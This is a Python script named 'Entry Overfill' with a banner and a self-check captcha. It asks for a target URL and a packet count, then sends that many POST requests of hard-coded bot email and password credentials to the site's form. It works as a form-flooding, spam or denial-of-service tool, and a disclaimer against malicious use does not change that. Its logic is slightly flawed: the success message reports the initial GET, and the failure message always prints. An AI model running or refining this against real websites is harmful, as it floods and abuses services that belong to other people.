import string
import random
import requests
from requests import *
import pyfiglet
import platform

####################
# ENTRY OVERFILL BY EFROXE
# DO NOT USE THIS APP FOR MALICIOUS PURPOSE. THE CREATOR IS NOT RESPONSIBLE FOR ANY MALICIOUS ACT.
####################

def captcha():
    success = False
    N = 7
    res = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=N))
    print("Your code: ", res)

    while not success:
        captchaInput = input("Application > ")
        if captchaInput != res:
            print("Incorrect")
        else:
            print("Success")
            success = True

def sendRequest():
    try:
        print(pyfiglet.figlet_format('Entry       OverFill'))
        captcha()
        SYSTEM_RUNNING_OS = platform.system()
        if SYSTEM_RUNNING_OS == 'Windows':
            print("Your system is running windows. It is preferred to run this file in your CMD.")
        else:
            print("You are not running Windows.  Entry Overfill may not work properly.")
        ENTER_URL = input("Enter the URL to send requests (including 'https'/'http'): ")
        URL = ENTER_URL
        MY_DATA = {
            'email': 'b0tRequestEMAIL098@protonmail.com',
            # 'username': 'b0tUserNAME123',             #UN-COMMENT THIS LINE TO HAVE 3 EFFECTIVE REQUEST TYPES, (USERNAME TOO)
            'password': 'b0tpassWORD567'
        }
        r = requests.get(URL)
        r.text

        PACKET_SENT = int(input("Enter how many packets you want to send: "))
        i = 0
        while (i<PACKET_SENT):
            request_SENT = requests.post(URL, data=MY_DATA)
            if request_SENT:
                print('sent #'+str(i)+'\n'+str(r.ok)+' PACKET SENT SUCCESSFULLY')
            i+=1
        else:
            print("COULD NOT SEND REQUESTS: WEBSITE PROBABLY DOESN'T CONTAIN DATA ENTRIES")

    except requests.exceptions.MissingSchema as REMS:
        print("INVALID URL: URL MUST CONTAIN https OR http")
    except ValueError as VE:
        print("VALUE ERROR: PACKETS MUST BE -INT- INSTEAD OF -STR-")

if __name__ == "__main__":
    print("Starting application EntryOverfill")
    sendRequest()